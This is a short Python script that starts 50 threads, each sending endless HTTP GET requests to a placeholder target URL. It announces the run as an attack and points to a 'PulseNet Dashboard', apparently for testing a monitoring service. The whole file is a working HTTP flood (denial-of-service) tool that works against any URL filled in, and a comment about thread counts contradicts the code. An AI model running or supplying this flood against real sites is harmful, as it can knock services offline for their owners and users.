import threading
import requests
import time

# Use URL here
target = "insert your url"

def attack():
    while True:
        try:
            requests.get(target)
        except:
            pass

print("🔥 Attack Started! Check your PulseNet Dashboard.")
# Start with 10 threads (Codespaces might rate-limit if you use 50)
count = 0 
for i in range(50):
    threading.Thread(target=attack, daemon=True).start()
    count +=i

    print(f"The attack number is {count}")

while True:
    time.sleep(1)
